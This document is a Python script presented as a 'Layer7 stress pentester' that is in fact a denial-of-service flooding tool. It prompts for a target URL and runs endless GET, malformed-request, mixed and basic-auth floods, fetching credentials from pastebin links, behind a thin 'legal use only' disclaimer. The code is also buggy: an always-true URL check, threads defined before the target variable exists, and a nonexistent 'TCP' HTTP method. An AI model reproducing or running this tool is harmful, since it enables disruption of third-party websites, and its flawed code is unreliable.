import os
import requests
from colorama import Fore
import threading
from requests.auth import HTTPBasicAuth

userURL = requests.get("https://pastebin.pl/view/raw/6d6d234f")
passURL = requests.get("https://pastebin.pl/view/raw/9856f832")



def http_get(num):
    while True:
        requests.get(ip)
        requests.get(ip)
        requests.get(ip)
        requests.get(ip)

def http_req(num):
    while True:
        requests.request(url=ip, method="TCP")
        requests.request(url=ip, method="TCP")
        requests.request(url=ip, method="TCP")
        requests.request(url=ip, method="TCP")

def http_mix(num):
    while True:
        requests.get(ip)
        requests.request(url=ip, method="TCP")
        requests.get(ip)
        requests.request(url=ip, method="TCP")

def http_auth(num):
    while True:
        requests.get(ip, auth=HTTPBasicAuth(userURL.text, passURL.text))
        requests.get(ip, auth=HTTPBasicAuth(userURL.text, passURL.text))
        requests.get(ip, auth=HTTPBasicAuth(userURL.text, passURL.text))




if __name__ =="__main__":
    # creating thread
    a1 = threading.Thread(target=http_get, args=(1000,))
    a2 = threading.Thread(target=http_req, args=(1000,))
    a3 = threading.Thread(target=http_mix, args=(1000,))
    a4 = threading.Thread(target=http_auth, args=(1000,))




logo = '''


 ██████╗  █████╗ ██╗      █████╗ ██╗  ██╗██╗   ██╗    ██╗  ██╗   ██╗███████╗
██╔════╝ ██╔══██╗██║     ██╔══██╗╚██╗██╔╝╚██╗ ██╔╝    ██║  ╚██╗ ██╔╝╚════██║
██║  ███╗███████║██║     ███████║ ╚███╔╝  ╚████╔╝     ██║   ╚████╔╝     ██╔╝
██║   ██║██╔══██║██║     ██╔══██║ ██╔██╗   ╚██╔╝      ██║    ╚██╔╝     ██╔╝ 
╚██████╔╝██║  ██║███████╗██║  ██║██╔╝ ██╗   ██║       ███████╗██║      ██║  
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚══════╝╚═╝      ╚═╝  
                                                                            
      * Galaxy LY7 Basic Layer7 Stress Pentester by WeepingAngel *
            USE FOR LEGAL PESTETING AND EDUCATION ONLY!
                | Dont Hit any .edu or .gov Websites! |



'''



os.system("title [/] User: %username%  GalaxyLY7  Servers: [1]") # Its jsut decoration :) Linux Useres Pls REmove this :)


print(Fore.LIGHTMAGENTA_EX + logo)
ip = input("Enter Target URL > ")

if ip == "http://" or "https://":
    print(Fore.RED + "Attack Method:")
    print(Fore.LIGHTMAGENTA_EX + "[1] HTTP-GET Flood         | HTTP-GET Flood Bypass")
    print(Fore.LIGHTMAGENTA_EX + "[2] HTTP-REQUEST Flood     | HTTP-REQUEST Flood Bypass")
    print(Fore.LIGHTMAGENTA_EX + "[3] HTTP-MIX Flood         | HTTP-MIX GET and Request Mixed")
    print(Fore.LIGHTMAGENTA_EX + "[4] HTTP-AUTH Flood        | HTTP-AUTH Flood Large Dictory")
    x = input("root~GalaxyLY7~$ ")

    if x == "1":
        print("Attack Started | Going Dark!")
        a1.start()
        a1.join()

    if x == "2":
        print("Attack Started | Going Dark!")
        a2.start()
        a2.join()

    if x == "3":
        print("Attack Started | Going Dark!")
        a3.start()
        a3.join()

    if x == "4":
        print("HTTP-AUTH Attack Started | Going Dark!")
        a4.start()
        a4.join()

else:
    print("Please enter a URL Not an IP!")
    exit(code=-1)


